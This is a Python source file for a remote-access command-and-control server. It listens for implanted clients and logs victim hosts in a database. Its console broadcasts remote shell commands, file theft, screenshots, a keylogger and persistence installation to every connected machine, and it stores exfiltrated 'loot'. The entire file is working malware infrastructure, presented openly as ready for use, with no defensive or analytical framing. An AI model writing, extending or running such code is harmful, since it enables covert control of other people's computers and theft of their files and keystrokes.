import socket
import threading
import json
import os
import base64
import hashlib
import time
import sqlite3
from datetime import datetime
from pathlib import Path
import subprocess
import shutil

class AdvancedC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_lock = threading.Lock()
        self.loot_dir = Path("loot")
        self.loot_dir.mkdir(exist_ok=True)
        self.db_path = Path("c2.db")
        self.setup_database()
        self.running = True
        print("="*80)
        print("🔥 ADVANCED C2 SERVER - PRODUCTION READY 🔥")
        print(f"Listening: {host}:{port}")
        print(f"Loot: {self.loot_dir.absolute()}")
        print("="*80)

    def setup_database(self):
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.execute('''CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, last_seen TEXT, status TEXT,
            os TEXT, arch TEXT, user TEXT
        )''')
        self.conn.execute('''CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, type TEXT, 
            filename TEXT, size INTEGER, timestamp TEXT
        )''')
        self.conn.commit()

    def recv_exactly(self, sock, length):
        """Receive EXACTLY 'length' bytes or return None"""
        data = b''
        while len(data) < length:
            chunk = sock.recv(4096)
            if len(chunk) == 0:
                return None
            data += chunk
        return data

    def send_exactly(self, sock, data):
        """Send data with 4-byte length prefix"""
        try:
            msg = json.dumps(data).encode('utf-8')
            length = len(msg)
            sock.sendall(length.to_bytes(4, 'big'))
            sock.sendall(msg)
            return True
        except:
            return False

    def update_client(self, client_id, info=None):
        """Update client database"""
        try:
            if info:
                self.conn.execute('''INSERT OR REPLACE INTO clients 
                    (id, ip, hostname, last_seen, status, os, arch, user)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                    (client_id, info.get('ip', ''), info.get('hostname', ''), 
                     datetime.now().isoformat(), 'active', info.get('os', ''), 
                     info.get('arch', ''), info.get('user', '')))
            else:
                self.conn.execute('UPDATE clients SET last_seen=?, status="active" WHERE id=?',
                                (datetime.now().isoformat(), client_id))
            self.conn.commit()
        except:
            pass

    def handle_client(self, client_sock, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"\n[+] 🎯 NEW CLIENT: {client_id}")
        
        with self.client_lock:
            self.clients[client_id] = {'sock': client_sock, 'addr': addr}
            self.update_client(client_id)
        
        try:
            while self.running:
                # Receive length
                len_data = self.recv_exactly(client_sock, 4)
                if not len_data:
                    break
                
                msg_len = int.from_bytes(len_data, 'big')
                msg_data = self.recv_exactly(client_sock, msg_len)
                if not msg_data:
                    break
                
                msg = json.loads(msg_data.decode('utf-8'))
                msg_type = msg.get('type', 'unknown')
                
                print(f"[+] 📨 {client_id} -> {msg_type}")
                
                if msg_type == 'heartbeat':
                    self.update_client(client_id)
                    continue
                
                elif msg_type == 'sysinfo':
                    self.update_client(client_id, msg.get('info', {}))
                    print(f"[+] 💻 {client_id}: {msg.get('info', {}).get('os', 'Unknown')}")
                    continue
                
                elif msg_type == 'shell_result':
                    self.handle_shell_result(client_id, msg)
                    continue
                
                elif msg_type == 'loot':
                    self.save_loot(client_id, msg)
                    continue
                
        except Exception as e:
            print(f"[-] 💥 {client_id}: {e}")
        finally:
            with self.client_lock:
                self.clients.pop(client_id, None)
            self.conn.execute('UPDATE clients SET status="inactive" WHERE id=?', (client_id,))
            self.conn.commit()
            try:
                client_sock.close()
            except:
                pass
            print(f"[-] 🔌 {client_id} DISCONNECTED")

    def handle_shell_result(self, client_id, msg):
        """Display shell output perfectly"""
        print(f"\n🖥️  SHELL OUTPUT FROM {client_id}")
        print("-" * 80)
        output = msg.get('output', 'No output')
        print(output)
        print("-" * 80)
        print()

    def save_loot(self, client_id, msg):
        """Save loot files"""
        try:
            loot_type = msg.get('loot_type', 'unknown')
            data_b64 = msg.get('data', '')
            filename = f"{client_id}_{loot_type}_{int(time.time())}.{loot_type}"
            filepath = self.loot_dir / filename
            
            data = base64.b64decode(data_b64)
            with open(filepath, 'wb') as f:
                f.write(data)
            
            self.conn.execute('INSERT INTO loot (client_id, type, filename, size, timestamp) VALUES (?, ?, ?, ?, ?)',
                            (client_id, loot_type, str(filepath), len(data), datetime.now().isoformat()))
            self.conn.commit()
            
            print(f"[+] 💾 LOOT SAVED: {filepath} ({len(data)} bytes)")
        except Exception as e:
            print(f"[-] 💾 Loot error: {e}")

    def send_to_client(self, client_id, cmd):
        """Send command to specific client"""
        with self.client_lock:
            if client_id not in self.clients:
                print(f"[-] Client {client_id} not connected")
                return False
            return self.send_exactly(self.clients[client_id]['sock'], cmd)

    def send_to_all(self, cmd):
        """Broadcast to all clients"""
        count = 0
        with self.client_lock:
            for client_id, client_data in self.clients.items():
                if self.send_exactly(client_data['sock'], cmd):
                    count += 1
                    print(f"[+] 📤 Sent to {client_id}")
        print(f"[+] 📢 Broadcast to {count}/{len(self.clients)} clients")
        return count > 0

    def cli_loop(self):
        """Advanced CLI Interface"""
        commands = {
            'help': self.cmd_help,
            'clients': self.cmd_clients,
            'loot': self.cmd_loot,
            'select': self.cmd_select,
            'shell': self.cmd_shell,
            'sysinfo': self.cmd_sysinfo,
            'download': self.cmd_download,
            'upload': self.cmd_upload,
            'screenshot': self.cmd_screenshot,
            'keylog': self.cmd_keylog,
            'persistence': self.cmd_persistence,
            'quit': self.cmd_quit
        }
        
        selected_client = None
        
        while self.running:
            try:
                cmd_input = input("\033[92mc2>\033[0m ").strip()
                parts = cmd_input.split()
                if not parts:
                    continue
                
                cmd = parts[0].lower()
                args = parts[1:]
                
                if cmd in commands:
                    commands[cmd](selected_client, args)
                elif cmd_input.lower() in ['exit', 'quit']:
                    break
                else:
                    print("\n❌ Unknown command. Type 'help'")
                    
            except (KeyboardInterrupt, EOFError):
                print("\n👋 Goodbye!")
                self.running = False
                break

    def cmd_help(self, selected, args):
        print("\n" + "="*80)
        print("🎯 ADVANCED C2 COMMANDS:")
        print("  clients              - List all connected clients")
        print("  loot                 - Show recent loot")
        print("  select <id>          - Select client for commands")
        print("  shell                - Interactive shell (broadcast)")
        print("  sysinfo              - Get system info (broadcast)")
        print("  download <path>      - Download file (broadcast)")
        print("  upload <localfile>   - Upload file (broadcast)")
        print("  screenshot           - Take screenshot (broadcast)")
        print("  keylog               - Start keylogger (broadcast)")
        print("  persistence          - Install persistence (broadcast)")
        print("  help                 - Show this help")
        print("="*80)

    def cmd_clients(self, selected, args):
        cur = self.conn.execute('SELECT * FROM clients WHERE status="active" ORDER BY last_seen DESC')
        print("\n🎯 ACTIVE CLIENTS:")
        print("ID" + " "*20 + "IP" + " "*12 + "OS" + " "*12 + "Last Seen")
        print("-"*80)
        for row in cur.fetchall():
            cid, ip, hostname, last_seen, status, os, arch, user = row
            print(f"{cid[:22]:22} {ip[:12]:12} {os[:12]:12} {last_seen[:19]}")
        print()

    def cmd_loot(self, selected, args):
        cur = self.conn.execute('SELECT * FROM loot ORDER BY timestamp DESC LIMIT 20')
        print("\n💾 RECENT LOOT:")
        print("Client" + " "*15 + "Type" + " "*10 + "File" + " "*20 + "Size")
        print("-"*80)
        for row in cur.fetchall():
            print(f"{row[1][:17]:17} {row[2]:10} {row[3][-25:]:25} {row[4]}B")
        print()

    def cmd_select(self, selected, args):
        global selected_client
        if not args:
            print(f"\n📍 Selected: {selected or 'None'}")
            return
        selected_client = args[0]
        print(f"\n📍 Selected client: {selected_client}")

    def cmd_shell(self, selected, args):
        print("\n🖥️ INTERACTIVE SHELL (broadcast to all)")
        while True:
            try:
                shell_cmd = input("shell> ").strip()
                if shell_cmd.lower() in ['exit', 'quit']:
                    break
                self.send_to_all({'type': 'shell', 'command': shell_cmd})
            except (EOFError, KeyboardInterrupt):
                break

    def cmd_sysinfo(self, selected, args):
        self.send_to_all({'type': 'sysinfo'})
        print("\n[+] 📡 Sysinfo command sent!")

    def cmd_download(self, selected, args):
        if not args:
            print("\n❌ Usage: download <remote_path>")
            return
        self.send_to_all({'type': 'download', 'path': args[0]})
        print(f"\n[+] 📥 Download '{args[0]}' sent!")

    def cmd_upload(self, selected, args):
        if not args:
            print("\n❌ Usage: upload <local_file>")
            return
        local_file = args[0]
        if not os.path.exists(local_file):
            print(f"\n❌ File not found: {local_file}")
            return
        try:
            with open(local_file, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            cmd = {'type': 'upload', 'filename': os.path.basename(local_file), 'data': data}
            self.send_to_all(cmd)
            print(f"\n[+] 📤 Upload '{local_file}' sent!")
        except Exception as e:
            print(f"\n❌ Upload error: {e}")

    def cmd_screenshot(self, selected, args):
        self.send_to_all({'type': 'screenshot'})
        print("\n[+] 📸 Screenshot command sent!")

    def cmd_keylog(self, selected, args):
        self.send_to_all({'type': 'keylog', 'duration': 30})
        print("\n[+] ⌨️ Keylogger started (30s)!")

    def cmd_persistence(self, selected, args):
        self.send_to_all({'type': 'persistence'})
        print("\n[+] 🔄 Persistence installed!")

    def cmd_quit(self, selected, args):
        self.running = False

    def start(self):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((self.host, self.port))
        server_sock.listen(50)
        
        print(f"\n🚀 Server ready! Type 'help' for commands\n")
        
        # Start CLI
        cli_thread = threading.Thread(target=self.cli_loop, daemon=True)
        cli_thread.start()
        
        # Accept clients
        while self.running:
            try:
                client_sock, addr = server_sock.accept()
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_sock, addr), 
                    daemon=True
                )
                client_thread.start()
            except:
                break
        
        server_sock.close()
        self.conn.close()

if __name__ == "__main__":
    server = AdvancedC2Server()
    server.start()